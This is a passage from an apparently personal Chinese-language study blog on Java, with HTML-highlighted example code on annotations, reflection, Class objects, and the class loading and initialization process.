&#125;<br>    <span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span><span class="hljs-comment">//镇压警告</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test02</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        test();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h4><ul><li><p>作用：<strong>负责注解其他注解</strong>，Java定义了4个标准的meta-annotation , 他们呃用来提供对其他annotation 类型做说明</p></li><li><p>这些类型在java.lang.annotation 包中可以找到（@Target @Retention @Documented @Inherited）</p><ul><li><p><strong>@Target</strong>： 描述注解的<strong>使用范围</strong>（<em>即：被描述的注解可以用在什么地方</em>）</p><ul><li>ElementType取值：<ol><li>TYPE:可以作用在类上</li><li>METHOD:可以作用于方法上</li><li>FIELD:可以作用于成员变量上</li></ol></li></ul></li><li><p><strong>@Retention</strong>:  表示需要在什么级别<strong>保存</strong>被描述的注解信息，用于描述注解的生命周期</p><p>（<em>SOURCE&lt;CLASS&lt;<strong>RUNTIME</strong></em>）</p><ul><li>RUNTIME:当前被描述的注解会被保存在class字节码文件中，并且被JVM读取到</li><li>CLASS:当前被描述的注解会被保存在class字节码文件中，但不会被JVM读取到</li><li>SOURCE:当前被描述的注解<strong>不会</strong>被保存在class字节码文件中</li></ul></li><li><p>@Document:说明被描述的注解将被包含在javadoc文档中</p></li><li><p>Inherited:说明子类可以继承父类中的被描述的注解</p></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.annotation;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.*;<br><br><span class="hljs-comment">//测试元注解</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test02</span> &#123;<br><br>&#125;<br><br><span class="hljs-comment">//@Target  注解作用范围</span><br><span class="hljs-comment">//定义一个注解 关键字 @interface  名称 MyAnnotation</span><br><span class="hljs-comment">//写元注解@Target @Retention @Documected</span><br> <span class="hljs-meta">@Target(value=&#123;ElementType.METHOD, ElementType.TYPE&#125;)</span><span class="hljs-comment">//表示MyAnnoation 能作用于方法，类</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-comment">//表示当前 被描述的注解 会保留到class字节码文件中，并被JVM读取到</span><br> <span class="hljs-meta">@Documented</span> <span class="hljs-comment">//该被描述的注解会被保留在javadoc文档中</span><br><span class="hljs-meta">@Inherited</span> <span class="hljs-comment">//子类可以继承父类该被描述的注解</span><br><span class="hljs-meta">@interface</span> MyAnnotation &#123;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h4><ul><li>关键字 @interface 自定义注解，自动继承了java.lang.annotation.Annotation 接口</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.annotation;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.ElementType;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.annotation.RetentionPolicy;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test03</span> &#123;<br>    <span class="hljs-comment">//注解可以显示赋值  可以默认值定义，没有默认值必须显示赋值</span><br>    <span class="hljs-comment">//显式定义格式 （参数=），没有固定顺序</span><br>    <span class="hljs-meta">@MyAnnotation2(age=18)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;&#125;<br><br><br>    <span class="hljs-comment">//显式赋值时，不写参数名的话，就必须只有一个参数且参数名默认必须为value 才不报错</span><br>    <span class="hljs-meta">@MyAnnotation3(&quot;秦疆&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span>&#123;&#125;<br><br><br>&#125;<br><br><span class="hljs-meta">@Target(&#123;ElementType.METHOD, ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@interface</span> MyAnnotation2&#123;<br>    <span class="hljs-comment">//这是注解的参数  ： 参数类型 +参数名（）; 命名要求最后要加括号</span><br>    String <span class="hljs-title function_">name</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//default 默认赋值</span><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">age</span><span class="hljs-params">()</span> ;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">id</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> -<span class="hljs-number">1</span>;<span class="hljs-comment">//如果默认值为-1，代表不存在。</span><br>    String[] school() <span class="hljs-keyword">default</span>&#123;<span class="hljs-string">&quot;西工大&quot;</span>,<span class="hljs-string">&quot;西部开源&quot;</span>&#125;;<br>&#125;<br><br><span class="hljs-comment">//只有一个参数</span><br><span class="hljs-meta">@Target(&#123;ElementType.METHOD, ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@interface</span> MyAnnotation3&#123;<br>    String <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>加载类，并允许以编程的方式解剖类中的各种成分（成员变量，方法，构造器）</p><ul><li><p><strong>动态语言：</strong>在运行时可以改变其结构的语言 eg: PHP Python JavaScript C #</p></li><li><p><strong>静态语言：</strong> 与动态语言相对应，运行时结构不可改变的语言 eg: Java  C  C++</p></li><li><p>Java不是动态语言，但Java 可以称之为“准动态语言”，即Java 有一定的动态性，我们可以利用<strong>反射机制</strong>获得类似动态语言的特性</p></li><li><p><strong>反射</strong>：是Java被视为动态语言的关键，反射机制允许程序在执行期间借助于Refelection API取得任何类的内部信息，并能直接操纵任意对象的内部属性及方法（可以直接二读取到private ）</p></li></ul><ol><li><p>反射第一步：加载类，获取类的字节码：Class对象（万物皆对象，获取类本身）</p></li><li><p>获取类的构造器对象：Constructor 对象</p></li><li><p>获取类的成员变量：Field 对象</p></li><li><p>获取类的成员方法对象：Method 对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.reflection;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Class.forName;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test02</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Object</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">//通过反射获取  User类 的Class对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.zhang.reflection.User&quot;</span>);<br>        System.out.println(c1);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.zhang.reflection.User&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.zhang.reflection.User&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c4</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.zhang.reflection.User&quot;</span>);<br><br>        <span class="hljs-comment">//一个类在内存中只有一个Class对象</span><br>        <span class="hljs-comment">//一个类被加载后，整个类的结构都会被封装在Class对象中</span><br>        System.out.println(c2.hashCode());<br>        System.out.println(c3.hashCode());<br>        System.out.println(c4.hashCode());<br>        <br>       <br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//实体类 ：pojo entity</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-comment">//有参构造器</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2025/03/26/%E6%B3%A8%E8%A7%A3-%E7%B1%BB%E5%8A%A0%E8%BD%BD-%E5%8F%8D%E5%B0%84/image-20250327222718531.png" alt="image-20250327222718531" style="zoom:50%;"></li></ol><h4 id="获取class对象的三种方式"><a href="#获取class对象的三种方式" class="headerlink" title="获取class对象的三种方式"></a><strong>获取class对象的三种方式</strong></h4><ul><li><p>Class c1&#x3D;类名.class    每一个类都有一个默认的class属性                 class关键字</p></li><li><p>调用Class提供的方法：Class c2&#x3D; Class. forName(“类的全类名”);            Class方法forName</p></li><li><p>通过实例 ：  Object 提供的方法： new 类（）； Class c3&#x3D;对象. getClass();         Object方法</p><p><strong>注意</strong>：[getClass 返回实际类型的Class类型] </p><p>​ [<em>子类Class 类型的对象</em> getSuperClass方法 可以获得父类的Class 对象 ]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student2</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> s1.getClass();<span class="hljs-comment">//创建对象，获得子类的Class对象</span><br>        c1.getSuperclass();<span class="hljs-comment">//通过子类Class对象，获得父类Class对象</span><br></code></pre></td></tr></table></figure><ul><li><p>特殊的： 基本内置类型的包装类都有一个Type 属性</p><p>Class c4&#x3D; Integer.TYPE;</p></li></ul></li></ul><p><em>获取类</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">//1.获取类本身：类.Class</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Student.class;<br>        System.out.println(c1);<br><br>        <span class="hljs-comment">//2.获取类本身：Class.forName(&quot;类的全类名&quot;)</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.zhang.reflection.Student&quot;</span>);<br>        System.out.println(c2);<br>        <span class="hljs-comment">//类对象在内存中只会加载一个</span><br>        System.out.println(c1 == c2);<span class="hljs-comment">//true  c1 c2 指向的都是同一个class</span><br><br><br>        <span class="hljs-comment">//3.获取类本身：对象.getClass()</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> s.getClass();<span class="hljs-comment">//任何对象都可以调getClass方法  因为它是Object的方法</span><br>        System.out.println(c3);<br>        System.out.println(c1 == c3);<span class="hljs-comment">//true  c1 c2 c3 指向的都是同一个class</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="所有类型的Class对象"><a href="#所有类型的Class对象" class="headerlink" title="所有类型的Class对象"></a>所有类型的Class对象</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">所有的Class类型：</span><br>类.class:Object.class<br>接口.class: Comparable.class<br>一维数组.class:String[].class<br>二维数组.class:String[][].class<br>注解.class: @Override.class<br>枚举.class: ElementType.class<br>基本数据类型.class: Integer.class    #Integer 是int 基本数据类型的包装类<br>void.class<br>Class.class<br><span class="hljs-meta prompt_"># </span><span class="language-bash">只要元素类型为度一样，就是同一个Class</span><br></code></pre></td></tr></table></figure><hr><h4 id="Java-内存分析"><a href="#Java-内存分析" class="headerlink" title="Java 内存分析"></a>Java 内存分析</h4><p><img src="/2025/03/26/%E6%B3%A8%E8%A7%A3-%E7%B1%BB%E5%8A%A0%E8%BD%BD-%E5%8F%8D%E5%B0%84/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20250328105121-17435969548973.png" alt="联想截图_20250328105121"></p><h3 id="——–"><a href="#——–" class="headerlink" title="——–"></a>——–</h3><h1 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h1><h4 id="了解类的加载过程："><a href="#了解类的加载过程：" class="headerlink" title="了解类的加载过程："></a><em>了解类的加载过程：</em></h4><ul><li><p>程序主动使用某个类时，如果该类还未被加载到内存中，系统会自动通过以下三个步骤对该类进行初始化：</p><ul><li><p>类的加载：将类的class文件读入内存，</p><p>并为之在堆中创建一个java.lang.Class对象。此过程<em><strong>由类加载器完成</strong></em></p><ul><li>加载完类之后<em><strong>，在堆中就产生了一个Class 类型的对象，</strong></em>一个类就只有一个Class对象，这个对象包含了完整的类的结构（成员变量，构造器，成员方法….），对象就像一面镜子，透过这个镜子，看到类的结构</li></ul></li><li><p>类的链接：将java类二进制数据合并到 JRE中</p><ul><li>验证：确保加载的类信息符合JVM规范，没有安全方面的问题</li><li>准备：正式为类变量 （static） 分配内存并设置类变量默认初始值的阶段（所以说static在初始化之前就已经有了一个值），这些内存都将在方法区中进行分配</li><li>解析：虚拟机常量池内的符号引用（常量名）替换为直接引用（地址）的过程</li></ul></li><li><p>类的初始化：JVM负责对类进行初始化</p><p>执行类构造器<clinit>()方法的过程，<code>类构造器&lt;clinit&gt;()方法</code> 是由编译器自动收集类中的所有类变量的赋值动作和静态代码块中的语句合并产生的（就是所有static 的变量和代码块）（类构造器是构造类信息的，<em>不是构造该类对象的构造器</em>）</clinit></p><p>当初始化一个类的时候，如果发现它的父类还没进行初始化，则先触发其父类的初始化</p><p>{说白了，类初始化就是通过类构造器<clinit>()方法将该类的<em><strong>静态变量和静态代码块</strong></em>合并}</clinit></p></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.reflection;<br><br><span class="hljs-keyword">import</span> javax.swing.plaf.synth.SynthOptionPaneUI;<br><span class="hljs-keyword">import</span> java.sql.SQLOutput;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        System.out.println(a.m);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 1.加载到内存，在堆中生成一个Class对象</span><br><span class="hljs-comment">        * 2.链接，提前将static 赋值为0（m=0）</span><br><span class="hljs-comment">        * 3.初始化，用&lt;clinit&gt;()方法，将静态变量，静态代码合并起来</span><br><span class="hljs-comment">        * &lt;clinit&gt;()&#123;</span><br><span class="hljs-comment">        * System.out.println(&quot;A类静态代码块初始化&quot;);</span><br><span class="hljs-comment">          m=300;</span><br><span class="hljs-comment">          m=100;</span><br><span class="hljs-comment">          *</span><br><span class="hljs-comment">          * 4.最后m=100</span><br><span class="hljs-comment">        * &#125; */</span><br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;A类静态代码块初始化&quot;</span>);<br>        m=<span class="hljs-number">300</span>;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> m=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;A类无参构造初始化&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><p><strong>所以回顾之前的一个结论 静态方法属于类，非静态方法属于对象：</strong></p><p>因为在验证准备阶段，在方法区中会为静态变量分配内存空间，而非静态方法依赖于该类的实例化对象，实例化时才会分配内存</p><p>​</p><hr><h4 id="Java程序的三个阶段："><a href="#Java程序的三个阶段：" class="headerlink" title="Java程序的三个阶段："></a><em>Java程序的三个阶段：</em></h4><p><strong>1 .<strong>先进行编译阶段 ： 源代码通过javac变成class字节码文件（字节码文件中有：类的属性，</strong>构造器</strong>，成员方法….）（存放于方法区）</p><p><strong>2 .</strong> 加载阶段：通过类加载器ClassLoader(体现反射)，在堆中产生了一个Class类型的对象</p><p>**3 .**Runtime运行阶段</p><p>new Cat()对象，这个Cat对象在堆中,&#x3D;&#x3D;该对象知道它是属于哪个Class对象的&#x3D;&#x3D;</p><p><img src="/2025/03/26/%E6%B3%A8%E8%A7%A3-%E7%B1%BB%E5%8A%A0%E8%BD%BD-%E5%8F%8D%E5%B0%84/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20250328112734-17435969263562.png" alt="联想截图_20250328112734"></p><hr><h4 id="类初始化的触发"><a href="#类初始化的触发" class="headerlink" title="类初始化的触发"></a>类初始化的触发</h4><blockquote><p>初始化阶段开始之前，自然还是要先经历 加载、验证、准备 、解析的。</p></blockquote><p>回顾类初始化：类构造器通过<clinit>方法将该类中的所有类变量和静态代码块合并起来</clinit></p><ul><li>类的主动引用一定会触发类的初始化<ul><li><u><em><strong>虚拟机启动，先初始化main方法所在的类</strong></em></u></li><li>new 类</li><li>使用java.lang.reflect包的方法进行反射调用  &#x3D;&#x3D;类.class调用反射不能触发类的初始化&#x3D;&#x3D;</li><li>直接用类调用静态方法或属性 （除了final变量）</li></ul></li><li>类的被动引用不会触发类的初始化<ul><li>子类调用父类的静态方法或属性（子类不会初始化，父类被初始化）</li><li>通过数组定义类引用</li><li>引用一个类中的常量，不会触发该类的初始化（<em><strong>常量在链接阶段就存入调用类的常量池中了</strong></em>）</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test06</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Main 类被加载&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">//1.主动引用 触发初始化</span><br>        <span class="hljs-comment">//Son son=new Son();</span><br><br><br>        <span class="hljs-comment">//2. 用java.lang.reflect包调用反射也能触发初始化</span><br>        <span class="hljs-comment">//Class&lt;?&gt; aClass = Class.forName(&quot;com.zhang.reflection.Son&quot;);</span><br>        <span class="hljs-comment">//** 用类默认的class属性  不能触发类的初始化  而 Object的getClass()方法 先new了就触发类的初始化啦</span><br>       <span class="hljs-comment">// Class&lt;Son&gt; sonClass = Son.class;</span><br><br><br>        <span class="hljs-comment">//3.子类调用自己的静态方法或属性  可以触发类初始化，父类未初始化的情况下，就先触发其父类的初始化</span><br>        <span class="hljs-comment">// System.out.println(Son.m);</span><br><br><br>        <span class="hljs-comment">//而不会触发类初始化的：</span><br>        <span class="hljs-comment">//1.子类调用父类静态方法或属性</span><br>       <span class="hljs-comment">//System.out.println(Son.b);</span><br>        <span class="hljs-comment">//2.数组</span><br>       <span class="hljs-comment">// Son[] array=new Son[10];//这个只会加载Main 方法，只初始化Test06</span><br>        <span class="hljs-comment">//3.常量</span><br>        <span class="hljs-comment">//System.out.println(Son.M);</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> b=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;父类被加载&quot;</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;子类被加载&quot;</span>);<br>        m=<span class="hljs-number">300</span>;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> m=<span class="hljs-number">200</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> M=<span class="hljs-number">11</span>;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="类加载器的作用"><a href="#类加载器的作用" 